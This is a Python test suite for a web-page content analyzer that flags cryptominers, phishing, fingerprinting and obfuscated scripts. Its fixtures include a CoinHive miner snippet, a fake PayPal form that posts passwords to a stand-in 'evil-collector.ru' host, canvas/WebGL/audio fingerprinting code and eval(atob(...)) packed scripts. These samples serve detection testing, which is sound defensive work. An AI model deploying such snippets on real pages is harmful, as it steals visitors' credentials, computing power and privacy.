#!/usr/bin/env python3
"""Site content-analyzer tests (valkyrie/site_analyzer.py).

Valkyrie genuinely READS the page and judges the content, not a name list.
These feed real page shapes to the pure scorer and check the verdict — and,
just as importantly, that a normal clean page scores allow (the FP boundary,
since this analyzer runs on real sites the user visits).

  [1] Cryptominer content -> block (miner)
  [2] Cross-origin credential form / brand impersonation -> block (phishing)
  [3] Multi-technique fingerprinting -> block/flag (fingerprinting)
  [4] Obfuscated/packed malware JS -> block (malware)
  [5] Tracker-heavy page -> categorised tracker (density is informational, no list)
  [6] Clean normal page -> allow  (the false-positive boundary)
  [7] third_party_hosts extraction is correct + first-party excluded
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

_FAILURES: list[str] = []


def _check(label: str, ok: bool) -> None:
    print(f"  [{'+' if ok else '!'}] {label}: {'PASS' if ok else 'FAIL'}")
    if not ok:
        _FAILURES.append(label)


def main() -> int:
    from valkyrie.site_analyzer import analyze_content, third_party_hosts

    print("\n=== site content analyzer ===\n")

    print("[1] Cryptominer")
    miner = """<html><head><script src="/lib.js"></script><script>
        var miner = new CoinHive.Anonymous('SITE_KEY', {throttle: 0.3});
        miner.start(); // hashesPerSecond
    </script></head><body>Free movies</body></html>"""
    v = analyze_content(miner, "http://free-movies-4u.biz")
    _check("miner page blocks", v.decision == "block")
    _check("miner categorised", v.category == "miner")

    print("\n[2] Phishing — cross-origin password form + brand impersonation")
    phish = """<html><head><title>PayPal - Log In</title></head><body>
        <form action="https://evil-collector.ru/harvest.php" method="post">
        <input type="text" name="email"><input type="password" name="pw">
        <button>Log In</button></form></body></html>"""
    v = analyze_content(phish, "http://paypa1-secure-login.tk")
    _check("phishing page blocks", v.decision == "block")
    _check("phishing categorised", v.category == "phishing")
    _check("phishing reason names cross-origin post",
           any("cross-origin" in r for r in v.reasons))

    print("\n[3] Browser fingerprinting library (multiple techniques)")
    fp = """<script>
        var c=document.createElement('canvas');var ctx=c.getContext('2d');
        ctx.fillText('fp',2,2);var data=c.toDataURL();
        var gl=c.getContext('webgl');var dbg=gl.getExtension('WEBGL_debug_renderer_info');
        var ac=new AudioContext();var comp=ac.createDynamicsCompressor();
        var m=navigator.hardwareConcurrency; var d=navigator.deviceMemory;
    </script>"""
    v = analyze_content(fp, "http://track3r.example")
    _check("fingerprinting (3+ techniques) blocks", v.decision == "block")
    _check("fingerprinting categorised", v.category == "fingerprinting")

    print("\n[4] Obfuscated / packed malware JS")
    obf = """<script>eval(atob('dmFyIHg9MTt4Kys7'));</script>
        <script>eval(function(p,a,c,k,e,d){return p}('...',10,10,''.split('|')))</script>"""
    v = analyze_content(obf, "http://sketchy-download.top")
    _check("obfuscated JS blocks", v.decision == "block")
    _check("obfuscated categorised as malware", v.category == "malware")

    print("\n[5] Tracker-heavy page (third-party density, NO name list)")
    tp_html = "<html><body>" + "".join(
        f'<script src="https://adhost{i}.example{i}.com/t.js"></script>' for i in range(16)
    ) + "</body></html>"
    v = analyze_content(tp_html, "http://news-site.example")
    # Density is informational: it categorises as tracker and surfaces the count,
    # but does NOT flag/block on its own (too noisy — a site's own CDNs count too).
    _check("tracker-heavy page categorised 'tracker'", v.category == "tracker")
    _check("density count surfaced", any("third-party" in r for r in v.reasons))
    _check("density alone does not block", v.decision != "block")

    print("\n[6] Clean normal page -> allow (FP boundary)")
    clean = """<html><head><title>Jane's Bakery</title>
        <link rel="stylesheet" href="/style.css">
        <script src="/app.js"></script>
        <script src="https://www.googletagmanager.com/gtag/js"></script>
        </head><body><h1>Welcome</h1><p>Fresh bread daily.</p>
        <img src="/hero.jpg"><form action="/subscribe"><input type="email"></form>
        </body></html>"""
    v = analyze_content(clean, "http://janes-bakery.com")
    _check(f"clean page allows (score={v.score})", v.decision == "allow")
    # A normal login page (same-origin password form) must NOT be phishing.
    login = """<html><head><title>Sign in - Jane's Bakery</title></head><body>
        <form action="/login" method="post"><input type="password" name="pw"></form>
        </body></html>"""
    v2 = analyze_content(login, "http://janes-bakery.com")
    _check(f"same-origin login page allows (score={v2.score})", v2.decision == "allow")

    print("\n[7] third_party_hosts extraction")
    html = ('<script src="https://cdn.foo.com/a.js"></script>'
            '<img src="https://track.evil.net/p.gif">'
            '<a href="https://janes-bakery.com/about">about</a>'
            '<script src="/local.js"></script>')
    hosts = third_party_hosts(html, "janes-bakery.com")
    _check("extracts third-party registrable domains", "foo.com" in hosts and "evil.net" in hosts)
    _check("first-party + relative excluded",
           "janes-bakery.com" not in hosts and len(hosts) == 2)

    print("\n" + "=" * 54)
    if _FAILURES:
        print(f"FAILED: {len(_FAILURES)} check(s)")
        for f in _FAILURES:
            print(f"  - {f}")
        return 1
    print("All checks PASSED.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
